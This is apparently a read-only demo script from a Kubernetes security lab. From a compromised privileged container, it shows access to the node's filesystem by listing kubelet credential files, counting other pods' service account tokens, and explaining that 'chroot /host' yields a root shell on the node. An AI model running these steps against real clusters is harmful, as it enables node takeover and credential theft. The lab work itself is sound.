#!/usr/bin/env bash
# Scenario 1 demo: from the (compromised) web container, show that the worker
# node itself is exposed. READ-ONLY: we list and count, we never print secret
# material, write to the node or start a shell on it.
set -euo pipefail
source "$(dirname "$0")/../lib.sh"

echo "Scenario 1: privileged pod + hostPath  (overlay: $(overlay))"
require_web

step "Foothold: who are we inside the web container?"
pod=$(in_web cat /etc/hostname)
node=$(kubectl -n "$NS" get pod "$pod" -o jsonpath='{.spec.nodeName}')
info "pod:  $pod   (scheduled on node: $node)"
info "user: $(in_web id)"

step "Capabilities of our process (CapEff)"
cap=$(in_web sh -c "grep CapEff /proc/self/status | cut -f2")
info "CapEff = $cap"
info "000001ffffffffff = every capability; a default (non-privileged) root"
info "container gets 00000000a80425fb, a non-root one gets 0000000000000000"

step "The node's root filesystem is mounted at /host"
info "node hostname read from /host/etc/hostname: $(in_web cat /host/etc/hostname)"
info "-> that is the NODE ($node), not our pod ($pod)"

step "Kubelet credentials on the node (names only, contents not printed)"
in_web sh -c 'ls -1 /host/var/lib/kubelet/pki/' | sed 's/^/    /'
info "kubelet-client-*.pem is the node's identity towards the API server"

step "Service account tokens of OTHER pods on this node (count only)"
tokens=$(in_web sh -c "find /host/var/lib/kubelet/pods -path '*kubernetes.io~projected*' -name token 2>/dev/null | wc -l")
info "readable tokens: $tokens"
info "each one lets the attacker act as that pod's service account"

cat <<'EOF'

Impact: this is a container escape without any exploit. As root with all
capabilities and the node's / mounted read-write, "chroot /host" is a root
shell on the worker node. From there: every pod on the node, its secrets,
the kubelet's credentials. We stop here on purpose (no chroot, no writes).

Next: make verify-1   (exit 0 = still exploitable)
EOF
